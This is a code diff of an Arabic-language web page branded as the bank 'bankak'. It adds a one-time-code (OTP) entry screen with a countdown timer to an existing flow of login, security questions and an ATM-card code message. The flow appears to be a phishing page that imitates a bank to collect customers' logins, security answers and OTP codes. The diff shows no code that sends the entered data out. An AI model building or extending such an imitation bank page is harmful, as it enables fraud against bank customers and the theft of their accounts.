@@ -308,7 +308,6 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        /* تحذير جهاز مختلف - بدون أيقونة إيموجي */
         .warning-box {
             background: #fff5f5;
             border-radius: 12px;
@@ -440,7 +439,7 @@
             background: #c1121f;
         }
 
-        /* ===== رسالة الصراف الآلي (تظهر في منتصف الشاشة) ===== */
+        /* ===== رسالة الصراف الآلي ===== */
         .atm-overlay {
             display: none;
             position: fixed;
@@ -484,7 +483,7 @@
             font-size: 28px;
             font-weight: 800;
             color: #c1121f;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
         }
 
         .atm-box .sub-text {
@@ -508,6 +507,142 @@
         }
 
         .atm-box .btn-close-atm:hover {
+            background: #c1121f;
+        }
+
+        /* ===== صفحة OTP ===== */
+        #otpPage {
+            display: none;
+            padding: 40px 16px 30px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .otp-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .otp-header h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #c1121f;
+        }
+
+        .otp-header h1 i {
+            color: #e63946;
+            margin-left: 6px;
+        }
+
+        .otp-card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .otp-timer {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: #c1121f;
+            margin-bottom: 16px;
+            direction: ltr;
+        }
+
+        .otp-timer i {
+            color: #e63946;
+            margin-left: 8px;
+        }
+
+        .otp-timer .time {
+            background: #f8f9fa;
+            padding: 4px 16px;
+            border-radius: 30px;
+            display: inline-block;
+        }
+
+        .otp-message {
+            text-align: center;
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .otp-message i {
+            color: #e63946;
+            margin-left: 6px;
+        }
+
+        .otp-card input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            background: #fafafa;
+            margin-bottom: 16px;
+            text-align: center;
+            letter-spacing: 4px;
+            direction: ltr;
+        }
+
+        .otp-card input:focus {
+            outline: none;
+            border-color: #e63946;
+            background: white;
+        }
+
+        .otp-actions {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+
+        .otp-actions button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: 0.3s;
+            min-width: 100px;
+        }
+
+        .btn-resend {
+            background: #0a66c2;
+            color: white;
+        }
+
+        .btn-resend:hover {
+            background: #004182;
+        }
+
+        .btn-resend:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-otp-cancel {
+            background: #f0f0f0;
+            color: #555;
+        }
+
+        .btn-otp-cancel:hover {
+            background: #e0e0e0;
+        }
+
+        .btn-otp-submit {
+            background: #e63946;
+            color: white;
+        }
+
+        .btn-otp-submit:hover {
             background: #c1121f;
         }
 
@@ -615,6 +750,9 @@
             .security-card .question-box { font-size: 14px; }
             .atm-box .big-text { font-size: 24px; }
             .atm-box .sub-text { font-size: 16px; }
+            .otp-header h1 { font-size: 24px; }
+            .otp-timer { font-size: 18px; }
+            .otp-actions button { font-size: 12px; padding: 10px; min-width: 80px; }
         }
     </style>
 </head>
@@ -695,13 +833,11 @@
         </div>
 
         <div class="security-card">
-            <!-- تحذير جهاز مختلف (بدون إيموجي) -->
             <div class="warning-box">
                 <div class="title"><i class="fas fa-exclamation-triangle"></i> ترغب في استخدام موبايل مختلف؟</div>
                 <div class="desc">اذا كنت تحاول الدخول من جهاز موبايل مختلف (غير الموبايل المسجل) أضغط على زر إعادة التعيين واتبع التعليمات</div>
             </div>
 
-            <!-- سؤال الأمان -->
             <div class="question-label">
                 <i class="fas fa-question-circle"></i> الإجابة على أسئلة الأماكن
                 <small>اختر الإجابة الصحيحة للسؤال التالي:</small>
@@ -718,8 +854,6 @@
                 <button class="btn-security" onclick="verifySecurity()">إرسال</button>
             </div>
 
-            <!-- تم حذف زر "شارك رمز" نهائياً -->
-
             <div class="security-links">
                 <a href="#">فيس بوك</a>
                 <a href="#">المساعدة</a>
@@ -729,13 +863,40 @@
         </div>
     </div>
 
-    <!-- ===== رسالة الصراف الآلي (تظهر في منتصف الشاشة) ===== -->
+    <!-- ===== رسالة الصراف الآلي ===== -->
     <div class="atm-overlay" id="atmOverlay">
         <div class="atm-box">
             <i class="fas fa-credit-card"></i>
-            <div class="big-text">🔑 سيتم إرسال رمز</div>
+            <div class="big-text">سيتم إرسال رمز</div>
             <div class="sub-text">إلى بطاقة الصراف الآلي الخاصة بك</div>
-            <button class="btn-close-atm" onclick="closeAtmMessage()">حسناً</button>
+            <button class="btn-close-atm" onclick="closeAtmAndShowOtp()">حسناً</button>
+        </div>
+    </div>
+
+    <!-- ===== صفحة OTP ===== -->
+    <div id="otpPage">
+        <div class="otp-header">
+            <h1><i class="fas fa-shield-alt"></i> بنك bankak</h1>
+        </div>
+
+        <div class="otp-card">
+            <div class="otp-timer">
+                <i class="fas fa-clock"></i>
+                <span class="time" id="timerDisplay">09:09</span>
+            </div>
+
+            <div class="otp-message">
+                <i class="fas fa-envelope"></i>
+                تم إرسال الرمز السري (OTP) إلى رقم هاتفك المسجل/البريد الإلكتروني.
+            </div>
+
+            <input type="text" id="otpInput" placeholder="أدخل الرمز السري (OTP)" maxlength="6" inputmode="numeric" />
+
+            <div class="otp-actions">
+                <button class="btn-resend" id="resendBtn" onclick="resendOtp()">إعادة إرسال</button>
+                <button class="btn-otp-cancel" onclick="cancelOtp()">إلغاء</button>
+                <button class="btn-otp-submit" onclick="submitOtp()">إرسال</button>
+            </div>
         </div>
     </div>
 
@@ -765,7 +926,7 @@
     </div>
 
     <script>
-        // ===== الأسئلة (تم حذف سؤال الشارع وتصحيح الإملاء) =====
+        // ===== الأسئلة (تم حذف سؤال الشارع) =====
         const securityQuestions = [
             "ما هو اسم المدرسة التي التحقت بها؟",
             "اسم فريق كرة القدم المفضل لديك؟",
@@ -775,6 +936,8 @@
         ];
 
         let currentQuestionIndex = 0;
+        let timerInterval = null;
+        let timeSeconds = 549; // 9:09
 
         // ===== تحديث السؤال =====
         function updateQuestion() {
@@ -789,14 +952,19 @@
             updateQuestion();
         }
 
-        // ===== التحقق =====
+        // ===== التحقق من إجابة الأمان =====
         function verifySecurity() {
             const answer = document.getElementById('securityAnswer').value.trim();
             if (answer === '') {
                 alert('الرجاء إدخال الإجابة على سؤال الأمان');
                 return;
             }
-            alert('✅ تم التحقق بنجاح!');
+            // بعد الإجابة الصحيحة، ننتقل لصفحة OTP مباشرة (بدون رسالة الصراف)
+            // لكن حسب طلبك، بعد الإجابة نذهب لصفحة OTP
+            document.getElementById('securityPage').style.display = 'none';
+            document.getElementById('otpPage').style.display = 'block';
+            document.getElementById('footer').style.marginTop = '0';
+            startTimer();
         }
 
         // ===== إلغاء =====
@@ -811,13 +979,89 @@
             }
         }
 
-        // ===== رسالة الصراف الآلي (بخط كبير في منتصف الشاشة) =====
+        // ===== رسالة الصراف الآلي =====
         function showAtmMessage() {
             document.getElementById('atmOverlay').classList.add('active');
         }
 
-        function closeAtmMessage() {
+        function closeAtmAndShowOtp() {
             document.getElementById('atmOverlay').classList.remove('active');
+            document.getElementById('securityPage').style.display = 'none';
+            document.getElementById('otpPage').style.display = 'block';
+            document.getElementById('footer').style.marginTop = '0';
+            startTimer();
+        }
+
+        // ===== المؤقت =====
+        function startTimer() {
+            timeSeconds = 549; // 9:09
+            updateTimerDisplay();
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(function() {
+                timeSeconds--;
+                updateTimerDisplay();
+                if (timeSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    document.getElementById('resendBtn').disabled = false;
+                }
+            }, 1000);
+            document.getElementById('resendBtn').disabled = true;
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(timeSeconds / 60);
+            const secs = timeSeconds % 60;
+            document.getElementById('timerDisplay').textContent = 
+                String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+        }
+
+        // ===== إعادة إرسال OTP =====
+        function resendOtp() {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            timeSeconds = 549;
+            updateTimerDisplay();
+            document.getElementById('resendBtn').disabled = true;
+            timerInterval = setInterval(function() {
+                timeSeconds--;
+                updateTimerDisplay();
+                if (timeSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    document.getElementById('resendBtn').disabled = false;
+                }
+            }, 1000);
+            alert('تم إعادة إرسال الرمز السري');
+        }
+
+        // ===== إلغاء OTP =====
+        function cancelOtp() {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            document.getElementById('otpPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+            document.getElementById('footer').style.marginTop = '30px';
+            document.getElementById('otpInput').value = '';
+        }
+
+        // ===== إرسال OTP =====
+        function submitOtp() {
+            const otp = document.getElementById('otpInput').value.trim();
+            if (otp === '') {
+                alert('الرجاء إدخال الرمز السري');
+                return;
+            }
+            if (otp.length < 4) {
+                alert('الرمز السري يجب أن يكون 4-6 أرقام');
+                return;
+            }
+            alert('✅ تم التحقق بنجاح!');
+            // هنا يمكن التوجه للوحة التحكم
         }
 
         // ===== إظهار/إخفاء كلمة المرور =====
@@ -889,8 +1133,6 @@
                 document.getElementById('loginPage').style.display = 'none';
                 document.getElementById('securityPage').style.display = 'block';
                 document.getElementById('footer').style.marginTop = '0';
-                
-                // تعيين أول سؤال
                 currentQuestionIndex = 0;
                 updateQuestion();
             }, 2000);
@@ -913,10 +1155,21 @@
             }
         });
 
+        document.getElementById('otpInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitOtp();
+            }
+        });
+
+        // ===== منع إدخال غير أرقام في OTP =====
+        document.getElementById('otpInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
         // ===== إغلاق رسالة الصراف بالضغط خارجها =====
         document.getElementById('atmOverlay').addEventListener('click', function(e) {
             if (e.target === this) {
-                closeAtmMessage();
+                this.classList.remove('active');
             }
         });
     </script>
